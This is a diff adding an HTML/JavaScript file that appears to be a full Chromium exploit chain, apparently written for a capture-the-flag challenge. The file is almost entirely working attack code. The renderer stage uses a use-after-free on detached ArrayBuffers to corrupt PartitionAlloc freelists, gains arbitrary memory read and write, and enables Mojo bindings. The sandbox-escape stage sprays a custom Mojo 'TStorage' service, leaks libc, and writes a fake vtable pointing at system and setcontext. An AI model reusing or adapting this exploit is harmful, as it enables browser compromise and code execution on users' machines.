@@ -1,0 +1,600 @@
+<script src="../mojo_bindings.js"></script>
+<script src="../third_party/blink/public/mojom/tstorage/tstorage.mojom.js"></script>
+<script src="../third_party/blink/public/mojom/blob/blob_registry.mojom.js"></script>
+<script src="../third_party/blink/public/mojom/blob/blob.mojom.js"></script><script src="../third_party/blink/public/mojom/blob/blob_url_store.mojom.js"></script>
+</script><script src="../third_party/blink/public/mojom/blob/data_element.mojom.js"></script>
+<script>
+</script><script src="../third_party/blink/public/mojom/blob/serialized_blob.mojom.js"></script>
+<script src="../third_party/blink/public/mojom/array_buffer/array_buffer_contents.mojom.js"></script>
+<script src="../mojo/public/mojom/base/big_buffer.mojom.js"></script>
+<script src="../url/mojom/url.mojom.js"></script>
+<script>
+
+let conversion_buffer = new ArrayBuffer(8);
+let float_view = new Float64Array(conversion_buffer);
+let int_view = new BigUint64Array(conversion_buffer);
+BigInt.prototype.hex = function() {
+    return '0x' + this.toString(16);
+};
+BigInt.prototype.i2f = function() {
+    int_view[0] = this;
+    return float_view[0];
+}
+BigInt.prototype.smi2f = function() {
+    int_view[0] = this << 32n;
+    return float_view[0];
+}
+Number.prototype.f2i = function() {
+    float_view[0] = this;
+    return int_view[0];
+}
+Number.prototype.f2smi = function() {
+    float_view[0] = this;
+    return int_view[0] >> 32n;
+}
+
+Number.prototype.fhw = function() {
+    float_view[0] = this;
+    return int_view[0] >> 32n;
+}
+
+Number.prototype.flw = function() {
+    float_view[0] = this;
+    return int_view[0] & BigInt(2**32-1);
+}
+
+Number.prototype.i2f = function() {
+    return BigInt(this).i2f();
+}
+Number.prototype.smi2f = function() {
+    return BigInt(this).smi2f();
+}
+
+function hex(a) {
+    return "0x" + a.toString(16);
+}
+
+
+if(typeof(Mojo) !== "undefined"){
+    console.log("GOT MOJO!!!")
+    console.log(typeof(Mojo));
+    function getAllocationConstructor() {
+        let blob_registry_ptr = new blink.mojom.BlobRegistryPtr();
+        Mojo.bindInterface(blink.mojom.BlobRegistry.name,
+                            mojo.makeRequest(blob_registry_ptr).handle, "process", true);
+
+        function Allocation(size=0x700) {
+          function ProgressClient(allocate) {
+            function ProgressClientImpl() {
+            }
+            ProgressClientImpl.prototype = {
+              onProgress: async (arg0) => {
+                if (this.allocate.writePromise) {
+                  this.allocate.writePromise.resolve(arg0);
+                }
+              }
+            };
+            this.allocate = allocate;
+
+            this.ptr = new mojo.AssociatedInterfacePtrInfo();
+            var progress_client_req = mojo.makeRequest(this.ptr);
+            this.binding = new mojo.AssociatedBinding(
+              blink.mojom.ProgressClient, new ProgressClientImpl(), progress_client_req
+            );
+
+            return this;
+          }
+
+          this.pipe = Mojo.createDataPipe({elementNumBytes: size, capacityNumBytes: size});
+          this.progressClient = new ProgressClient(this);
+          blob_registry_ptr.registerFromStream("", "", size, this.pipe.consumer, this.progressClient.ptr).then((res) => {
+            this.serialized_blob = res.blob;
+          })
+
+          this.malloc = async function(data) {
+            promise = new Promise((resolve, reject) => {
+              this.writePromise = {resolve: resolve, reject: reject};
+            });
+            this.pipe.producer.writeData(data);
+            this.pipe.producer.close();
+            written = await promise;
+            console.assert(written == data.byteLength);
+          }
+
+          this.free = async function() {
+            this.serialized_blob.blob.ptr.reset();
+            await sleep(1000);
+          }
+
+          this.read = function(offset, length) {
+            this.readpipe = Mojo.createDataPipe({elementNumBytes: 1, capacityNumBytes: length});
+            this.serialized_blob.blob.readRange(offset, length, this.readpipe.producer, null);
+            return new Promise((resolve) => {
+              this.watcher = this.readpipe.consumer.watch({readable: true}, (r) => {
+                result = new ArrayBuffer(length);
+                this.readpipe.consumer.readData(result);
+                this.watcher.cancel();
+                resolve(result);
+              });
+            });
+          }
+
+          this.readQword = async function(offset) {
+            let res = await this.read(offset, 8);
+            return (new DataView(res)).getBigUint64(0, true);
+          }
+
+          return this;
+        }
+
+        async function allocate(data) {
+          let allocation = new Allocation(data.byteLength);
+          await allocation.malloc(data);
+          return allocation;
+        }
+        return allocate;
+     }
+
+
+    (async function poc() {   
+    var spray_inst = [];
+
+
+
+    let allocate = getAllocationConstructor();
+    for(var i = 0; i < 3000; i++){
+
+
+            var x = new blink.mojom.TStoragePtr();
+            Mojo.bindInterface(blink.mojom.TStorage.name,  mojo.makeRequest(x).handle);
+
+            await x.init();
+            var z = (await x.createInstance()).instance;
+
+            spray_inst.push({"stor":x,"inst":z});
+            //console.log(spray_inst[0])
+    }
+
+
+    /* prepare leeks */ 
+
+    var atoi_addr = (await spray_inst[0]["stor"].getLibcAddress()).addr
+    libc_base = atoi_addr - 0x40680;
+    libc_bss_addr = libc_base + 0x3eb000
+    system_ptr        = libc_base + 0x4f440;
+    setcontext        = libc_base + 0x520c7
+
+    console.log("libc base  @ "+hex(libc_base))
+    console.log("bss            @ "+hex(libc_bss_addr))
+    console.log("system_ptr @ "+hex(system_ptr))
+
+
+    let alloc_count = 0x1000;
+
+    let data = new ArrayBuffer(0x700);
+    let b64arr = new BigUint64Array(data);
+    let view = new DataView(data);
+
+
+    b64arr.fill(0x41414242434344n);
+    let sprayed_val = 0x41414242434344
+
+    /*
+    let command = "/bin/sh -c echo sice > /tmp/x";
+    for(var i = 0; i < command.length;i++){
+            view.setUint8(i,command.charCodeAt(i));
+    }
+
+
+    view.setUint8(command.length,0x0) // null terminate
+    */
+
+    var bss_offs = libc_bss_addr+0xae0;
+    console.log("writing to "+hex(bss_offs));
+
+    /* ROP */
+    b64arr[0] = BigInt(bss_offs-0x10);
+    b64arr[0xa8/8] = BigInt(system_ptr); // rcx, future rip
+    b64arr[0x68/8] = BigInt(bss_offs+8); // rdi
+
+
+
+    //view.setUint8(command.length,0x0);
+    b64arr[(0x670/8)] = BigInt(sprayed_val); // double offs
+    b64arr[(0x648/8)] = BigInt(bss_offs);
+
+    b64arr[(0x650/8)] = BigInt(bss_offs) // vtable things
+    b64arr[(0x658/8)] = BigInt(bss_offs)
+    b64arr[(0x660/8)] = BigInt(0n)
+
+
+
+    //////////////////
+
+
+
+
+
+
+    for(var i =0; i < 3000; i++){
+            if((i % 300 )== 0){continue;}
+            await spray_inst[i]["stor"].ptr.reset();
+
+    }
+    /*for(var i = 0; i < spray_inst.length-1; i++){
+            var leek = (await spray_inst[i]["inst"].getDouble()).value.f2i()
+            if(leek != 0){console.log("leek @ "+i+ " -> "+ hex(leek));}
+
+            for(var j = 0; j < 200; j++){
+                    var tmp = (await spray_inst[i]["inst"].get(j)).value
+                    if(tmp != 0){
+                            console.log("ary @ "+i+ "["+j+"] -> "+ hex(tmp));
+                    }
+            }
+    }*/
+
+
+
+
+    await (Array(alloc_count).fill().map(() => allocate(data)))
+
+    //console.log("after -> " + (await tinstance_ptr.getInt()).value);
+    //console.log("after -> " + (await tinstance_ptr.push(0x1234)).value);
+    // size 0x678 or 0x700
+    var used_indexes = []
+
+    top:
+    for(var i = 0; i < spray_inst.length-1; i++){
+            var tmp = (await spray_inst[i]["inst"].getDouble()).value.f2i()
+            //console.log("i->"+ i + " " + tmp.toString(16));
+            if(BigInt(tmp) == sprayed_val && (used_indexes.indexOf(i) == -1)){
+                    used_indexes.push(i);
+                    console.log("siced");
+                    (await spray_inst[i]["inst"].push(setcontext));
+                    (await spray_inst[i]["inst"].push(0x2a67616c662f2e));
+                    (await spray_inst[i]["inst"].getTotalSize());
+                    //spray_inst[i]["inst"].ptr.reset();
+                    //
+                    //(await spray_inst[i]["inst"].push(0x414142424343));
+                    //(await spray_inst[i]["inst"].push(0x414142424343));
+                    break top;
+
+            }
+
+    }
+
+    console.log("hello!")
+    while(1){};
+
+
+
+    })();
+
+    //while(1){};
+}else{
+
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+function getSuperPageBase(addr) {
+    let superPageOffsetMask = (BigInt(1) << BigInt(21)) - BigInt(1);
+    let superPageBaseMask = ~superPageOffsetMask;
+    let superPageBase = addr & superPageBaseMask;
+    return superPageBase;
+}
+ 
+function getPartitionPageBaseWithinSuperPage(addr, partitionPageIndex) {
+    let superPageBase = getSuperPageBase(addr);
+    let partitionPageBase = partitionPageIndex << BigInt(14);
+    let finalAddr = superPageBase + partitionPageBase;
+    return finalAddr;
+}
+ 
+function getPartitionPageIndex(addr) {
+    let superPageOffsetMask = (BigInt(1) << BigInt(21)) - BigInt(1);
+    let partitionPageIndex = (addr & superPageOffsetMask) >> BigInt(14);
+    return partitionPageIndex;
+}
+ 
+function getMetadataAreaBaseFromPartitionSuperPage(addr) {
+    let superPageBase = getSuperPageBase(addr);
+    let systemPageSize = BigInt(0x1000);
+    return superPageBase + systemPageSize;
+}
+ 
+function getPartitionPageMetadataArea(addr) {
+    let superPageOffsetMask = (BigInt(1) << BigInt(21)) - BigInt(1);
+    let partitionPageIndex = (addr & superPageOffsetMask) >> BigInt(14);
+    let pageMetadataSize = BigInt(0x20);
+    let partitionPageMetadataPtr = getMetadataAreaBaseFromPartitionSuperPage(addr) + partitionPageIndex * pageMetadataSize;
+    return partitionPageMetadataPtr;
+}
+
+function byteSwapBigInt(x) {
+    let result = BigInt(0);
+    let tmp = x;
+ 
+    for (let i = 0; i < 8; i++) {
+            result = result << BigInt(8);
+            result += tmp & BigInt(0xFF);
+            tmp = tmp >> BigInt(8);
+    }
+ 
+    return result;
+}
+
+function detachBuffer(x){
+    try{
+        var w = new Worker("");
+        w.postMessage("",[x]);     
+        w.terminate();
+    }catch(ex){
+        console.log("exception when detaching")
+    }
+}
+
+function gc() {
+    for (let i = 0; i < 50; ++i) {
+
+    let buffer = new ArrayBuffer(1024 * 1024);
+  }
+}
+
+
+
+//console.log("start!")
+const UAF_SIZE = 0xc;
+const SPRAY_CNT = 0x40000;
+const FLT_ARR_SZ = 0x1; // 0x200;
+var x = new Float64Array(10);
+var y = new Float64Array(10);
+var buff = new ArrayBuffer(8);
+var view = new DataView(buff);
+var sice = {"wwww":0x1337}
+var marker2 = (0xdeadbeefn).i2f();
+var no_gc = [];
+spray_ary = [];
+
+for(var i = 0; i < 100;i++){
+    no_gc.push(new Float64Array(FLT_ARR_SZ).fill(1.1))
+    spray_ary.push(new Array(FLT_ARR_SZ).fill(marker2));
+
+}
+
+
+var uaf = new Float64Array(FLT_ARR_SZ).fill((0x4141424243434444n).i2f());
+var leaks = new Float64Array(FLT_ARR_SZ);
+for(var i = 0; i < 100;i++){
+    detachBuffer(no_gc[i].buffer);
+}
+
+
+
+detachBuffer(uaf.buffer);
+
+
+for(var i = 0; i < 100; i++){
+    gc();
+}
+
+for(var i = 0; i < 800000;i++){
+    no_gc.push(new Float64Array(0x40).fill(1.1))
+}
+
+
+
+leaks.set(uaf,0);
+console.log(leaks);
+var page_leak = leaks[0].f2i();
+if(page_leak == 0 || page_leak == 0x4141424243434444n){
+    throw 1;
+}
+var be_leak = page_leak;
+view.setBigUint64(0,page_leak,true)
+page_leak = view.getBigUint64(0,false);
+super_base = getSuperPageBase(page_leak);
+partition_idx = getPartitionPageIndex(page_leak);
+part_page = getPartitionPageBaseWithinSuperPage(page_leak,partition_idx);
+metadata_base = getMetadataAreaBaseFromPartitionSuperPage(page_leak);
+metadata_area = getPartitionPageMetadataArea(page_leak);
+chrome_base = 0n;
+
+console.log("page leak         -> "+hex(page_leak));
+console.log("super base        -> "+hex(super_base));
+console.log("partition idx     -> "+hex(partition_idx));
+console.log("partition page    -> "+hex(part_page));
+console.log("metadata rel base -> "+hex(metadata_base));
+console.log("metadata area     -> "+hex(metadata_area));
+
+gcPreventer = [];
+
+leaks[0] = byteSwapBigInt(metadata_area).i2f();
+uaf.set(leaks,0);
+console.log("debug time");
+//while(1){}
+var cnt = 0;
+do {
+        gcPreventer.push(new ArrayBuffer(0x8));
+        leaks.set(uaf,0);
+        if(++cnt > 0x1000000){
+            throw 24;
+        }
+        if(leaks[0] == 0){
+            ////console.log("got null, sice?");
+            break;
+        }
+} while (1);
+
+
+
+//console.log("sice???")
+let freelist = new BigUint64Array(new ArrayBuffer(0x8));
+gcPreventer.push(freelist);
+
+function read64(rwHelper, addr) {
+    rwHelper[0] = addr;
+    var tmp = new BigUint64Array(1);
+    tmp.buffer;
+    gcPreventer.push(tmp);
+    tmp[0] =  byteSwapBigInt(rwHelper[0]); // restore
+    return tmp[0];
+}
+ 
+function write64(rwHelper, addr, value) {
+    var backup = rwHelper[0]
+    rwHelper[0] = addr;
+    var tmp = new BigUint64Array(1);
+    tmp.buffer;
+    tmp[0] = value;
+    gcPreventer.push(tmp);
+    rwHelper[0] = backup;
+}
+
+
+//console.log(hex(read64(freelist,)));
+chrome_base = read64(freelist,metadata_area+16n) - 0xaa246a8n;
+frame_map_ptr = chrome_base + 0xaa693a8n
+console.log("chrome base @ "+ hex(chrome_base))
+console.log("g_frame_map @ "+ hex(frame_map_ptr))
+
+frame_map_ptr += 0x8n;
+begin_ptr = read64(freelist,frame_map_ptr);
+console.log("begin_ptr @ "+ hex(begin_ptr))
+
+node_ptr = read64(freelist,begin_ptr+0x28n);
+console.log("node_ptr @ "+hex(node_ptr));
+
+render_frame_ptr = node_ptr;
+//render_frame_ptr = read64(freelist,render_frame_ptr1);
+console.log("render_frame_ptr @ "+hex(render_frame_ptr));
+
+
+
+enabled_bindings = render_frame_ptr + 0x580n;
+console.log("enabled_bindings @ "+hex(enabled_bindings));
+
+write64(freelist,enabled_bindings,0x2n);
+console.log("quick sleep");
+
+console.log("go reload!!!");
+freelist[0] = page_leak;
+leaks[0] = (0n).i2f()
+uaf.set(leaks,0);   
+window.location.reload();
+}
+/*
+
+  let frame_map_ptr = oob.getUint64(frame_ptr) + kFrameMapDelta;
+
+  // g_frame_map is a lazy instance, first element should be a pointer to the
+  // actual map instance, which will be directly following
+  if (oob.getUint64(frame_map_ptr) != frame_map_ptr + 0x8n) {
+    print('  [!] error finding g_frame_map');
+    return;
+  }
+
+  frame_map_ptr += 0x8n;
+  print('  [*] frame_map_ptr:     0x' + frame_map_ptr.toString(16));
+  //oob.hexdump(frame_map_ptr, 0x100);
+
+  let begin_ptr = oob.getUint64(frame_map_ptr);
+  print('  [*] begin_ptr:         0x' + begin_ptr.toString(16));
+  //oob.hexdump(begin_ptr, 0x30);
+
+  //print(oob.getUint64(begin_ptr + 0x20n).toString(16));
+
+  // this is an std::map, which is structured as an RBTree
+  // TODO: traverse map properly or call the static function.
+  //if (oob.getUint64(begin_ptr + 0x20n) != web_frame_ptr) {
+  //  print('[!] error finding RenderFrameImpl');
+  //  return;
+  //}
+
+  let node_ptr = oob.getUint64(begin_ptr + 0x8n);
+  print('  [*] node_ptr:          0x' + node_ptr.toString(16));
+  //oob.hexdump(node_ptr, 0x30);
+  
+  // blink::RenderFrameImpl
+  render_frame_ptr = oob.getUint64(node_ptr + 0x28n);
+  print('  [*] render_frame_ptr:  0x' + render_frame_ptr.toString(16));
+  //oob.hexdump(render_frame_ptr, 0x800);
+
+  const kEnabledBindingsOffset = 0x6f0n;
+  let enabled_bindings = oob.getUint32(render_frame_ptr + kEnabledBindingsOffset);
+  print('  [*] enabled_bindings:  0x' + enabled_bindings.toString(2));
+  oob.setUint32(render_frame_ptr + kEnabledBindingsOffset, 2);
+
+  oob.cleanup();
+
+  print('  [*] reloading');
+  window.location.reload();
+}
+
+
+*/
+
+// fix heap
+//leaks[0] = 0n;
+//uaf.set(leaks,0);
+
+
+
+//
+// uncomment for crash, sets next page ptr to garbage
+// leaks[0] = (0x4141424243434444n).i2f()
+// 
+//
+
+// hope it gets allocated on top of freed pages.. :(
+/*
+
+for(var i = 0; i < 0x100000; i++){
+    spray_ary.push(new Array(13.37,12.23,4.4,5.5,6.6,7.7,8.8));
+}
+*/
+
+//no_gc2 = [];
+/*
+for(var i = 0; i < 100000;i++){
+    no_gc2.push(new Float64Array(0x40).fill(1.1))
+}
+
+for(var i = 0; i < no_gc2.length;i++){
+    detachBuffer(no_gc2[i].buffer)
+}
+*/
+/*
+console.log("big gc now...")
+for(var i =0; i < 1000; i++){
+    gc();
+}
+
+console.log("gc ok");
+*/
+//await new Promise(r => setTimeout(r, 10000));
+/*
+for(var i = 0; i < 100000;i++){
+    no_gc2.push(new ArrayBuffer(0x1000));
+}
+*/
+
+
+/*no_gc = no_gc.concat(no_gc2)
+function check_for_cool_data(){
+    var tmp_arr = new Float64Array(0x4000);
+    for(var i = 0; i < no_gc.length;i++){
+        tmp_arr.set(no_gc[i]);
+        for(var j = 0; j < tmp_arr.length;j++){
+            var tmp_var = tmp_arr[j];
+            if(tmp_var != 1.1 && tmp_var != 0){
+                console.log("[+] @ "+i +" ["+j+"/"+tmp_arr.length+"] -> "+ hex(tmp_var.f2i()));
+            }
+        }
+    }
+}
+//check_for_cool_data();
+*/
+console.log("oki...")
+
+</script>
